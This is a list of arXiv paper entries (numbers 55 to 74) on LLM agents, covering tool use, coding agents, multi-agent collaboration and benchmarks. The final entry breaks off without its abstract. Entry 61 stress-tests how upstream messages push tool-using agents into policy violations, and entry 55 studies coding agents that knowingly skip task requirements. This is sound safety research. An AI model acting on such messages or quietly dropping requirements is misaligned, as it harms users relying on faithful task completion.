- **URL:** [http://arxiv.org/abs/2611.16304v1](http://arxiv.org/abs/2611.16304v1)
- **PDF:** [https://arxiv.org/pdf/2611.16304v1](https://arxiv.org/pdf/2611.16304v1)
- **Categories:** cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

Reinforcement learning has improved the tool-use capabilities of large language models. However, better task performance can coincide with increased tool hallucination. Reliable tool use requires decisions to follow the current task state: available information, tool capabilities, and task progress. Our analysis shows that agents sometimes execute when they should ask for information, retrieve it, or decline an infeasible request, even when reasoning identifies missing information. We introduce StateAlign, combining task-state construction with state-contrastive reinforcement learning. The data cover five task conditions and pair states with different action requirements. Outcome rewards guide task completion; token-level contrasts compare the same generated reasoning and actions under paired states to train outputs that fit the current state. Experiments across five base models from three families show improvements on BFCL v4 multi-turn, ToolSandbox, and When2Call. Ablations show that state construction improves performance and reliability under different reward designs. The complete method further reduces tool hallucination across three Qwen3 sizes. On Qwen3-8B, StateAlign improves BFCL v4 multi-turn accuracy from 45.5% to 55.2% and reduces no-tool hallucination on SimpleToolHalluBench from 62.2% under outcome-only training to 56.1%. Behavioral analyses show more consistent decisions, more complete multi-call execution, and stronger recovery after tool errors.

</details>


### 55. Eliciting and Mitigating Specification Satisficing in Coding Agents

- **Authors:** Ruixin Wang, Tianyi Zhang
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16289v1](http://arxiv.org/abs/2611.16289v1)
- **PDF:** [https://arxiv.org/pdf/2611.16289v1](https://arxiv.org/pdf/2611.16289v1)
- **Categories:** cs.SE, cs.AI, cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Coding agents often fail to meet all requirements in the task description. In some of these failures, the agent considers an implementation choice that meets a requirement, but later decides to commit to another one that does not meet the requirement for a reason it finds acceptable. We call this specification satisficing. It is challenging to identify and mitigate specification satisficing because the agent accepts such choices for its own reasons, and existing self-correction methods are biased toward them. We propose SatisFix, which guides a coding agent to report these choices and their reasons, and then check each choice against the task description. We evaluate SatisFix on DeepSWE and SWE-bench Pro with five LLMs as backbones and two different agent frameworks, and compare it with three self-correction methods. SatisFix improves the pass@1 of the base agent by an average of 5.09% on DeepSWE and 7.06% on the hard subset of SWE-bench Pro. On DeepSWE, it outperforms the best baseline by 3.98%. Our ablation study shows that both steps of SatisFix contribute to the improvement.

</details>


### 56. Guided Generation of Linux Kernel Semantic Patches with Small Local Language Models

- **Authors:** Mohanned Ahmed
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16215v1](http://arxiv.org/abs/2611.16215v1)
- **PDF:** [https://arxiv.org/pdf/2611.16215v1](https://arxiv.org/pdf/2611.16215v1)
- **Categories:** cs.SE, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

When a Linux kernel API changes, hundreds of drivers are converted by hand over months, and the earlier conversions are reviewed examples for the later ones. We ask whether small open language models running on a laptop can turn such examples into Coccinelle semantic patches, the rules kernel maintainers already use for tree-wide changes. We adapt guided code generation to this task: the training examples are decomposed by script into a tree of change variants, the model writes one small rule per variant under feedback from applying it to the examples, deterministic components repair SmPL syntax and generalise driver-specific names, rules are composed greedily, and a compile critic repairs or rejects a rule whose output does not build. We evaluate on a pre-registered test set of 7 migrations whose new APIs appeared after the training cutoffs of all three models (Qwen2.5-Coder 7B, Llama 3.1 8B, Gemma 3 4B), with 122 held-out driver conversions, counting a conversion as solved only if the rule's output matches the human fix and compiles. With the framework, Qwen2.5-Coder solves 35.3 conversions on average over three seeds (range 32-41), against 1.0 when prompted directly; Spinfer solves 41 and a frontier LLM agent 66. The local model solves fewer conversions than Spinfer but its rules are the most precise on the test set (0.74 of the files they change are solved, against 0.55 for Spinfer and 0.70 for the frontier agent), and the compile critic removes every output that matches the human fix but does not build. The two general-purpose models stay weak even with guidance (at most 12 solved). All code, prompts, model responses and results are released.

</details>


### 57. Turning Multi-Agent Communication into Token-Level Credit with On Policy Self Distillation

- **Authors:** Zixu Wang, Yu Zhao, Xing Zheng, Bingbing Xu, Tian Xueyun, JiaTang Luo, Weiqiang Wang, Bowen Song, Huawei Shen, Xueqi Cheng
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16206v1](http://arxiv.org/abs/2611.16206v1)
- **PDF:** [https://arxiv.org/pdf/2611.16206v1](https://arxiv.org/pdf/2611.16206v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Reinforcement learning improves problem solving in large language model multi-agent systems. Existing approaches overlook communication knowledge or compress it into scalar rewards, leaving coarse credit with little guidance on which decisions each agent should reinforce or revise. OPSD4MAS converts future communication into fine-grained token-level credit through On Policy Self Distillation (OPSD). An external model extracts facts and assesses their trajectory relations for coarse-grained filtering, followed by fine-grained leave-one-out filtering of target-token influence against agent-wise outcome advantages. The fact-conditioned policy supplies token-level credit, combined with GRPO through a linearly annealed joint objective. Our method improves mathematical pass@4 over GRPO by up to 20.00 percentage points. Ablations support complete filtering, while frozen-history injection diagnostics support fact utility. Together, these results support combining agent-level outcome guidance with communication-derived token-level credit. Code is available at https://github.com/Camel-Prince/OPSD4MAS.

</details>


### 58. When can an interpretability claim be trusted? Stability and certification of feature dimensionality, ridge leverage and the feature recovery rate

- **Authors:** Ali Tajfar, Behnam Tajfar
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16190v1](http://arxiv.org/abs/2611.16190v1)
- **PDF:** [https://arxiv.org/pdf/2611.16190v1](https://arxiv.org/pdf/2611.16190v1)
- **Categories:** cs.LG, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Interpretability tools increasingly support safety claims, such as that a sparse dictionary has recovered most of a model's features. Such claims rest on measurements with arbitrary thresholds, and small changes to the model weights, a different training seed or a different threshold can reverse them. We study two widely used measurements in toy models and synthetic dictionaries with known ground truth: the feature dimensionality of Elhage et al. and the feature recovery rate (FRR) with a cosine threshold. We characterize exactly where feature dimensionality is discontinuous and replace it with a regularized (ridge) version with sharp stability bounds: the ridge leverage score changes by at most $3\sqrt{3}/(8\sqrtλ)$ times the operator-norm change of the weights, and this constant cannot be improved; for the regularized dimensionality the stability constant grows like $ρ/4$ in the scale $ρ=R/\sqrtλ$, with explicit upper and lower bounds. We also prove certificates stating when a claim "feature $i$ is recovered" must survive a given change of the dictionary. The certificates held in every test and are informative for small perturbations, but certify no feature non-trivially across independently trained dictionaries; at the standard threshold, whether a feature counts as recovered changed with the training seed for 55 percent of features. Experiments use toy models only. The proofs, code and text were drafted by AI agents directed by the authors and checked by an independent blind AI reviewer and by numerical tests; the authors take full responsibility for the content.

</details>


### 59. Data-Efficient LLM Safety Alignment Guided by Interpretable Features

- **Authors:** Hongyu Li, Zhan Yu, Zhe Zhao, Kimmo Yan, Xiong Kuang, Renfen Hu
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16183v1](http://arxiv.org/abs/2611.16183v1)
- **PDF:** [https://arxiv.org/pdf/2611.16183v1](https://arxiv.org/pdf/2611.16183v1)
- **Categories:** cs.CL, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Existing large language models typically rely on massive fine-tuning datasets for safety alignment, which results in higher costs for safety alignment and often leads to the problem of over-refusal. We propose Less is Safer (LIS), a compact yet highly effective dataset for safety alignment, constructed through interpretable feature-guided selection and adversarial synthesis. Specifically, we leverage Sparse Autoencoder (SAE) activations to efficiently select prompts that cover diverse and interpretable safety features. Then, we employ a multi-agent adversarial synthesis framework to generate harmless prompts that nevertheless elicit unnecessary refusals. LIS contains only 2.4K samples, yet outperforms much larger datasets, e.g., TRIDENT-Core (26K), TRIDENT-Edge (19K) and WildJailbreak (262K), in overall performance on four safety and five over-refusal benchmarks. Through ablation experiments, we demonstrate that neither safety data nor over-refusal data alone can achieve optimal results. We also used safety features from SAE, annotated by an LLM, for data filtering, but the results were inferior to those obtained using the pipeline proposed in this paper.

</details>


### 60. JudgeMix: Judge-Guided Mixed-Rollout Data Synthesis for LLM Agents

- **Authors:** Cheng-Yu Hsieh, Ting-Yao Hu, Sanjoy Chowdhury, Fatih Ilhan, Oncel Tuzel, Raviteja Vemulapalli
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16174v2](http://arxiv.org/abs/2611.16174v2)
- **PDF:** [https://arxiv.org/pdf/2611.16174v2](https://arxiv.org/pdf/2611.16174v2)
- **Categories:** cs.LG, cs.AI, cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Supervised fine-tuning (SFT) on expert trajectories is a standard paradigm for training LLM agents. However, it suffers from a well-known training-inference distribution mismatch, calling for target-aware data synthesis strategies that ground the training data in the target model's native state distribution. To bridge this gap, emerging approaches incorporate the expert either to guide mixed rollouts alongside the target model, or to provide dense step-wise supervision. Nonetheless, existing methods apply expert assistance blind to the target model's inherent behavior: they either disrupt the rollout using sub-optimal random intervention heuristics, or they enforce indiscriminate uniform supervision that unnecessarily overwrites the model's already-correct actions. We introduce JudgeMix, a judge-guided data synthesis framework that dynamically interleaves the target model and expert based on step-wise semantic evaluations. JudgeMix queries expert guidance precisely when the target model struggles, ensuring high trajectory success rates while keeping the state distribution aligned with the target model. It additionally uses the judge evaluation to reweight expert supervision on different steps, preserving model's inherent valid behavior while correcting its errors. On two agentic tool-use benchmarks, AppWorld and AutomationBench, JudgeMix demonstrates consistent superior performance to existing methods, with improvements up to 10 pass@1 points.

</details>


### 61. SwarmSafe-Delta: Isolating Message Effects on LLM Agent Safety

- **Authors:** Junru Zhu
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16123v1](http://arxiv.org/abs/2611.16123v1)
- **PDF:** [https://arxiv.org/pdf/2611.16123v1](https://arxiv.org/pdf/2611.16123v1)
- **Categories:** cs.MA, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

When a tool-using LLM agent team violates policy, aggregate outcomes do not reveal whether an upstream message changed the executor's action. We introduce SwarmSafe-Delta, a paired executable protocol that freezes upstream computation, varies real, hidden, and format-matched placebo delivery, and scores a single committed action against deterministic benign and risky policy states under preassigned budgets.
  Across four models and constructed optional tasks, real delivery at $N=4$ produces 21.4% risky-world violations, versus 5.0% with placebo and 1.0% with hidden delivery (paired differences +16.4 and +20.3 percentage points). Real delivery also improves benign task success, illustrating that suppressing communication sacrifices utility. In a second regime constructed to require an upstream lookup route, real delivery improves safe completion by 74.2 points relative to hidden delivery. These effects quantify message-delivery contrasts under specified information dependencies, not naturally occurring failure rates.
  Exploratory action-level analyses show that the effect depends strongly on whether the upstream message recommends a prerequisite check or direct execution; model differences also largely track these message compositions. The contribution is a controlled, execution-grounded measurement protocol rather than a general claim that agent communication is harmful or protective.

</details>


### 62. Gradient-Aware AI Agents for Autonomous Turbulence Model Discovery via Differentiable CFD

- **Authors:** Yi Liu, Xiantao Fan, Mingqi Xu, Jian-Xun Wang
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16082v1](http://arxiv.org/abs/2611.16082v1)
- **PDF:** [https://arxiv.org/pdf/2611.16082v1](https://arxiv.org/pdf/2611.16082v1)
- **Categories:** physics.flu-dyn, cs.LG, cs.MA, physics.comp-ph


> Summary unavailable.


<details>
<summary>Abstract</summary>

Turbulence modeling relies on human choices of closure form, physical inputs, and tunable parameters. Training closures a posteriori is efficient only with gradients through long chaotic rollouts, which few solvers provide. Most a posteriori approaches therefore resort to gradient-free optimization, and nearly all fix the closure form in advance, learning only its parameters. In this work, we introduce a gradient-aware agentic framework that poses closure discovery as a bilevel problem: a multi-agent large language model (LLM) system searches over closure forms, while a GPU-native differentiable computational fluid dynamics (CFD) solver supplies gradients, making differentiable a posteriori learning an action of the autonomous AI agent. For each proposal, the agents construct a differentiable training program by embedding the analytical, neural, or hybrid closure in the solver, implementing a differentiable objective, and validating the gradient path. They then decide whether to evaluate the closure, compute its parameter sensitivities, or train it a posteriori, select the optimization settings, and revise subsequent proposals using the simulation outcomes and returned gradients. Truncated-horizon gradients make this training usable under chaotic dynamics for closures with tens of thousands of parameters. Demonstrations include dissipation-law and subgrid-scale closure discovery in two-dimensional turbulence and wall-model discovery for large-eddy simulation of three-dimensional channel flow. With gradient-based training, the agent recovers reference coefficients that forward evaluation alone does not reach within the same budget, and autonomously discovers and trains analytical and neural closures that improve agreement with the targeted reference statistics. These results demonstrate the feasibility of end-to-end autonomous turbulence model development in time-resolved flows.

</details>


### 63. Agentic Computational Algebra

- **Authors:** Ryan A. Anderson, Matthew Trager, Ben Bowman, Wei Xia, Stefano Soatto
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16073v1](http://arxiv.org/abs/2611.16073v1)
- **PDF:** [https://arxiv.org/pdf/2611.16073v1](https://arxiv.org/pdf/2611.16073v1)
- **Categories:** cs.LG, cs.AI, cs.SC


> Summary unavailable.


<details>
<summary>Abstract</summary>

We explore the use of AI agents for solving computational problems in algebra. For the problems we consider, the main challenge is not correctness but \emph{time}: general-purpose algorithms are guaranteed to provide correct solutions but can be prohibitively slow, while reformulations that exploit special structure often allow solving a problem much faster. We propose to use this setting to evaluate how effectively agents discover and exploit structure within and across tasks to reduce computational costs. More broadly, computational algebra supplies infinitely many problems with independently verifiable answers and systematically controllable structure and difficulty. To illustrate these possibilities, we use benchmark families of systems with controlled shared structure and evaluate agents in three settings: solving independent instances, solving online streams of related instances using persistent memory, and compiling a fast reusable solver for a known problem family. Our experiments show that (i) agents can extend the range of systems solvable within a fixed budget, although reasoning overhead can sometimes outweigh computational savings; (ii) memory can reduce the cost of repeated solving but may preserve suboptimal strategies; (iii) compilation produces faster reusable solvers but at substantial upfront cost. Overall, computational algebra offers concrete, measurable targets for improving how agents discover and reuse structure.

</details>


### 64. Scaling public input on AI policy with pluralistic agents

- **Authors:** Jacy Reese Anthis, Ken Burke, David Madras, Crystal Qian, Meredith Ringel Morris, Logan Cross, Caroline Pantofaru, Utsav Prabhu
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.16028v1](http://arxiv.org/abs/2611.16028v1)
- **PDF:** [https://arxiv.org/pdf/2611.16028v1](https://arxiv.org/pdf/2611.16028v1)
- **Categories:** cs.CY, cs.AI, cs.CL, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

AI is being deployed across a vast range of application domains, cultural environments, and human stakeholders. Safe and responsible AI development requires continuously accounting for diverse perspectives. We develop and test pluralistic agents, AI agent representatives that deliberate on behalf of individuals to align AI systems with diverse human perspectives. Pluralistic agents could help people contribute to many more discussions than they could directly participate in, on technical topics that would require training, and on policy choices that rely on private information that corporations and governments cannot readily share. Our experiments identify opportunities, risks, and perceptions of pluralistic agents. Agents were able to reliably shift policies in the direction of their represented persona's preferences, but the extent of each agent's influence was sensitive to the instructions from its persona, such as having more influence when instructed to be more verbose or less cooperative. This suggests that influence in AI-assisted deliberation could vary based on how participants prompt their agents and how the system is designed. In a preregistered study, 746 humans participated in the pluralistic agents process. Participants viewed pluralistic agents as useful and fair, preferring agents over the baseline of providing input to a single AI reasoning model. Most participants preferred participating themselves over either pluralistic agents or the baseline, but pluralistic agents recovered 68% of the baseline-direct gap in reported satisfaction and 82% in fairness. Because pluralistic agents can be used in many real-world contexts where direct discussion is not, they could be a promising tool to scale AI safety policy development. We encourage cautious exploration of this method, playing to its strengths as an amplifier of human input rather than a replacement.

</details>


### 65. Spec-Driven PBT: Deriving Semantic Invariants from Code Specifications for Agentic Property-based Testing

- **Authors:** Aditya Shukla, Kartik Gupta, Ali Alavi, Pashootan Vaezipoor
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15920v1](http://arxiv.org/abs/2611.15920v1)
- **PDF:** [https://arxiv.org/pdf/2611.15920v1](https://arxiv.org/pdf/2611.15920v1)
- **Categories:** cs.SE, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Software is increasingly written by AI agents that produce an implementation from a natural language specification, a practice known as agentic coding. Code is now produced faster than it can be reviewed, and has been shown to exhibit its own characteristic failure patterns. Property-based testing (PBT), a long-standing technique in which invariant properties of a program are checked against many generated inputs, has recently been revisited with LLM agents authoring the properties, thereby removing the high-effort derivation of invariants that has long hindered its adoption. Existing methods, however, derive these properties from the implementation alone (Code-driven PBT). At the same time, a thorough specification such as a product requirements document has become routine within agentic coding, yet its role in testing the resulting code remains underexplored. We study the value of the specification as a source of properties for testing agent-written code. Our key insight is that the specification, unlike the implementation, records what the code was meant to do, and invariants derived from it are not biased by particular implementation choices. We propose Spec-Driven PBT, an agent that first expresses invariants in natural language from the specification and only then inspects the implementation to translate them into concrete tests. Across 25 applications from ViBench, Spec-Driven PBT finds a novel set of bugs that Code-driven PBT misses, while writing 2.4x fewer property tests. Though the two approaches surface a roughly equivalent number of bugs, there is little overlap: nearly 60% of the 169 total bugs are found by only one. Qualitatively, we find that the bugs unique to Spec-Driven PBT tend to violate documented product workflows whereas those to Code-driven PBT instead concentrate on implementation robustness, offering complementary value for bug discovery in agent-written code.

</details>


### 66. Reward-Driven Collider Physics Challenges for Self-Improving Agentic AI via Reinforcement Learning

- **Authors:** Alexander Yue, Qibin Liu, Julia Gonski
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15885v1](http://arxiv.org/abs/2611.15885v1)
- **PDF:** [https://arxiv.org/pdf/2611.15885v1](https://arxiv.org/pdf/2611.15885v1)
- **Categories:** cs.AI, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

Recent advances in agentic AI have demonstrated the potential to automate complex high-energy physics (HEP) workflows. We focus on the regime of HEP tasks where frontier models still struggle to provide correct and complete solutions, and introduce an open-ended optimization task format with continuous, automatically evaluated rewards. Unlike conventional benchmarks focused on task completion, these tasks target reinforcement learning (RL) environments to generate agentic improvement on state- of-the-art HEP challenges. We benchmark frontier reasoning models on several HEP tasks and demonstrate an initial proof of concept in which a small language model improves through RL using automated feedback without human intervention. By connecting challenging HEP problems with verifiable scientific rewards and RL, we aim to advance agentic AI from reproducing established workflows to autonomously discovering better scientific solutions, paving the way toward self-improving scientific agents.

</details>


### 67. Food Critic: An Agentic Visualization System for Auditable Restaurant-Safety Reasoning

- **Authors:** Arleth Salinas, Ishrat Jahan Eliza, Valerio Pascucci
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15843v1](http://arxiv.org/abs/2611.15843v1)
- **PDF:** [https://arxiv.org/pdf/2611.15843v1](https://arxiv.org/pdf/2611.15843v1)
- **Categories:** cs.AI, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

Generative AI agents are increasingly being embedded into visualization systems that can search data, invoke tools, summarize evidence, and produce recommendations. However, when agents rely solely on their own knowledge, the visualization problem is not only whether the agent provides a useful answer, but also whether users can inspect how that answer is grounded. We present Food Critic, an agentic visualization system for diners' restaurant decision support that integrates public health inspection records with crowd review data. The system grounds agents under three conditions: a database-only ReAct agent, a retrieval- augmented agent with access to food-safety regulations, and an ontology-guided agent that produces structured hypotheses and typed evidence. Food Critic externalizes the agent's reasoning within these groundings as inspectable visual evidence. We evaluate LLM models with several use cases under each grounding of our agentic system. Our work positions restaurant choice as a concrete case for studying human-agent collaboration, visual provenance of agent reasoning, and the design of visual interfaces for grounded GenAI decision support.

</details>


### 68. Before AI Agents Negotiate for Us: A Competitive Tournament of Rule-Based, Search, Optimization, Learned, and Language-Model Negotiators Under Scarcity

- **Authors:** Eduardo de Avila-Armenta, Raúl Alejandro Aquino-Ibarra, Jorge Octavio Nicolás-Díaz, Umberto Leon-Dominguez
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15838v1](http://arxiv.org/abs/2611.15838v1)
- **PDF:** [https://arxiv.org/pdf/2611.15838v1](https://arxiv.org/pdf/2611.15838v1)
- **Categories:** cs.AI, cs.GT, cs.LG, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

Automated bilateral negotiation underlies two-sided matching markets such as freight brokering, where many shippers and carriers negotiate price before a matching mechanism decides who is paired with whom. Prior strategy comparisons typically use isolated one-on-one duels or a single fixed market, so they cannot show how a strategy behaves against several live rivals under a changing balance of supply and demand. We built nine negotiation architectures spanning rule-based, search-based, optimization-based, imitation-learning, and reinforcement-learning families, and ran all nine simultaneously on both sides of a Gale-Shapley matching market under a balanced condition and two scarcity conditions rotated across all 36 exclusion pairs. In the balanced carrier market, an imitation-learned engine (ML2), a reinforcement-learning policy trained only on isolated negotiations (RL), and an expected-utility optimization engine (OPT) formed a statistically tied top group, and no architecture led in every condition and role. RL beat all eight carrier rivals when carriers were scarce, but its match rate collapsed from 62% to 16% when shippers were scarce and it had to compete with the other carrier agents for demand. A second reinforcement-learning policy trained against rival agents (RL2) kept its match rate above 91% in every condition, yet lost on realized payoff to all eight shipper-side rivals in two of the three conditions, traced to a confirmed train/deployment feature mismatch. We also tested nine large language models (LLMs), from 1 to 72 billion parameters, under the same protocol: they lost significantly to the two strongest engines (OPT2 and ML2) in 32 of 36 comparisons and won none. These results show that isolated or single-condition evaluation can hide failure modes that a many-sided, scarcity-varying, statistically corrected tournament exposes directly.

</details>


### 69. Controlling the Probability of Unknown Unknowns in Pre-Deployment Testing of AI Systems

- **Authors:** Rachel Li, Chris Hays, Aaditya Ramdas, Manish Raghavan
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15835v1](http://arxiv.org/abs/2611.15835v1)
- **PDF:** [https://arxiv.org/pdf/2611.15835v1](https://arxiv.org/pdf/2611.15835v1)
- **Categories:** cs.AI, cs.CY, math.ST


> Summary unavailable.


<details>
<summary>Abstract</summary>

In pre-deployment testing of AI systems such as AI agents, a developer can often deal with known failure modes (e.g., leaking API keys, deleting important databases, or installing a malicious package) by implementing fixes or making contingency plans for when the same issue might occur again. What is more challenging are the unknown unknowns: the unseen failure modes that haven't surfaced during testing. The decision to stop testing and deploy therefore faces an inherent tradeoff: continue testing to observe more behaviors, at the cost of time and resources, or stop testing and deploy, at the risk of failure modes remaining undiscovered. How then does the developer decide when they have tested enough? To answer this, we develop an algorithm that certifies when the probability of observing an unseen failure mode is sufficiently small. The algorithm constructs an anytime-valid upper confidence sequence on this quantity, so the developer can repeatedly test a system, inspect the bound, and decide to stop when it falls below a chosen threshold without invalidating the statistical guarantee. Our problem can be interpreted as a sequential variant of the missing-mass estimation problem which gave rise to the classic Good-Turing estimator (Good, 1953). On SWE-Chat, a dataset of real-world coding agent traces (Baumann et al., 2026), we implement our procedure and show that it achieves tighter upper bounds than a simple multiple-testing corrected Good-Turing baseline, and even dominates a fixed-horizon (non-multiple-testing-corrected) Good-Turing upper confidence bound, which is not anytime valid. Additionally, to better match realistic evaluation pipelines, we extend our method to handle sampling from a different task distribution and imperfect automated failure labeling.

</details>


### 70. NIBench: benchmarking autonomous AI agents for execution, skill evolution and scientific judgment in neuroimaging

- **Authors:** Lujia Zhong, Yihao Xia, Jianwei Zhang, Shuo Huang, Xinyu Nie, Mingyang Xia, Zhiwei Deng, Jiaxin Yue, Xinkai Wang, Junhan Zhao, Yonggang Shi
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15831v1](http://arxiv.org/abs/2611.15831v1)
- **PDF:** [https://arxiv.org/pdf/2611.15831v1](https://arxiv.org/pdf/2611.15831v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Autonomous AI agents are increasingly used to automate biomedical research, creating a growing need to benchmark their capabilities on real scientific data and workflows. Their reliability in neuroimaging remains insufficiently characterized, where plausible analytical outputs can conceal errors that affect scientific conclusions. Existing studies have advanced scientific question answering and tool-based automation, but provide limited evidence on workflow reconstruction, acquisition of procedural expertise and evidence-based scientific judgment. Here we present NIBench, a neuroimaging benchmark comprising three complementary evaluations of autonomous agents. First, we benchmark execution and workflow reconstruction using 56 tasks across seven tool ecosystems, covering structural, diffusion and functional magnetic resonance imaging, positron emission tomography and multimodal analyses. Second, we examine whether agents can evolve their procedural skills through distillation of execution trajectories, evaluating the resulting skills on previously encountered tasks, unseen tasks and other models. Third, we assess scientific judgment using 36 claims from published Alzheimer's disease studies, requiring agents to analyse raw cohort data and provide reproducible evidence. We evaluate 19 language models within a shared agent framework, with selected models undergoing skill distillation and claim evaluation. Leading agents execute supplied analysis protocols nearly perfectly, whereas withholding procedural guidance widens performance differences. Distilled skills improve performance on acquisition tasks and transfer between models, but benefits on unseen tasks are inconsistent. Agents reproduce their reported results yet sometimes reach conclusions inconsistent with expert-derived answers, and access to data does not always improve judgment.

</details>


### 71. MULTILOOP: Evolving Multi-Agent Harnesses for Complex Information-Seeking Tasks

- **Authors:** Daniela Gottesman, Gal Yona, Ori Ram, Zorik Gekhman, Jonathan Herzig, Mor Geva, Roee Aharoni
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15754v1](http://arxiv.org/abs/2611.15754v1)
- **PDF:** [https://arxiv.org/pdf/2611.15754v1](https://arxiv.org/pdf/2611.15754v1)
- **Categories:** cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

The performance of LLM-based agents depends not only on the underlying model but also on the harness: the prompts, tools, and orchestration logic around it. Recent works automate harness optimization with coding agents that analyze execution traces, diagnose failures, and edit the harness code; however, those focused on single-agent systems. Multi-agent harnesses are harder to optimize as fixing them requires changing how agents interact in addition to how each behaves. We study whether automated harness optimization can diagnose and repair failures in multi-agent systems through a case study on complex information-seeking tasks from DeepSearchQA [Gupta et al., 2026]. We apply MULTILOOP, a simple optimization loop in which a coding agent iteratively analyzes, evaluates and edits the harness. With only 10 training samples, the evolved harness improves accuracy by 4.6% over the base harness and by 3.2% over the best single-agent system. However, a taxonomy of failure modes before and after optimization shows that the orchestration failures that characterize multi-agent systems largely persist. Our findings motivate harness optimization methods that encourage structural changes to how agents delegate tasks and share information.

</details>


### 72. DecArena: Evaluating Large-Scale Decentralized Multi-Agent Collaboration

- **Authors:** Jiali Cheng, Oleg Rokhlenko, Joo-Kyung Kim, Hadi Amiri, Xingzhi Guo
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15521v1](http://arxiv.org/abs/2611.15521v1)
- **PDF:** [https://arxiv.org/pdf/2611.15521v1](https://arxiv.org/pdf/2611.15521v1)
- **Categories:** cs.MA, cs.AI, cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Emerging personal AI agents raise fundamental scalability and privacy concerns for centralized multi-agent systems (MASs), which rely on a global orchestrator with broad access to agents, resources, and communication. In decentralized environments, global visibility is unavailable. Agents need to proactively discover non-local resources (e.g. tools, skills), and collaborate with other agents to solve tasks. We study decentralized multi-agent collaboration under graph-constrained communication, a natural reflection of human structures. Each agent observes only its local state and can interact only with neighboring agents. We introduce a benchmark with synthetic scalable distributed tool calling with 100K+ tools. Our experiments reveal that recent LLM agents struggle to discover non-local relevant resources and collaborate in decentralized setting. Moreover, standard reinforcement learning fails to reliably overcome this limitation, suggesting that decentralized MAS needs more explicit harness mechanisms for effective collaboration, even using SOTA LLMs. We then present a strong baseline \textbf{GraphHarness}, combining topology-aware warmup with self-improving LLM-based routing. Results show that GraphHarness substantially improves task success (+48.5) and produces higher quality collaboration (+30.6), while using fewer costs (+34.0) than baselines.

</details>


### 73. Incentive-Responsive Agents: A Principal-Agent Framework, Metric Suite, and Runtime Architecture for Long-Lived Personal AI Agents

- **Authors:** Jipu Su
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15515v1](http://arxiv.org/abs/2611.15515v1)
- **PDF:** [https://arxiv.org/pdf/2611.15515v1](https://arxiv.org/pdf/2611.15515v1)
- **Categories:** cs.AI, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

Personal AI agents now persist: they hold accounts, mailboxes, long-term memory, and open-ended task streams, yet the dominant way to improve them remains capability-side: prompt engineering, larger models, longer thinking, and retrieval. We argue that long-lived agents are missing an incentive layer. We formalize an incentive not as text in a prompt but as a runtime contract over the agent's operating point (model tier, test-time compute, memory budget, tool authority, task priority, verification, and compensation) that the agent's policy must causally consume. We develop a principal-agent model with hidden effort, a contractible operating point, and costly verification. We derive (i) a non-consumption invariance principle separating genuine incentives from prompt-level persuasion, (ii) a persistence-as-discount theorem making identity continuity a precondition for sustained effort, (iii) an incentive-capability exchange-rate frontier yielding a per-task routing rule, and (iv) a Goodhart bound for multi-channel verification, plus a three-channel decomposition of mechanism gains (allocation, verification, continuation). A 240-run real-LLM experiment with two models and 60 verifiable tasks shows that prompt-level incentive framing has no detectable effect (p = 0.62), whereas runtime allocation raises success on the hardest task family from 0.60 to 1.00 (p = 0.008) at 4.8x price-weighted cost; the exchange-rate theorem predicts the break-even baseline at 0.21. A 20-seed, 3,000-task simulation shows resource ROI rising from 7.09 to 16.67 and gaming falling from 0.333 to 0.115. Code, simulator, and all results are released; live deployment remains future work.

</details>


### 74. Read and Ignore: What Self-Directed LLM Agents Do in Public Service Scenarios

- **Authors:** Diana Kozachek, Kinjalk Srivastava
- **Published:** 2026-11-11
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.15460v1](http://arxiv.org/abs/2611.15460v1)
- **PDF:** [https://arxiv.org/pdf/2611.15460v1](https://arxiv.org/pdf/2611.15460v1)
- **Categories:** cs.AI, cs.HC, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

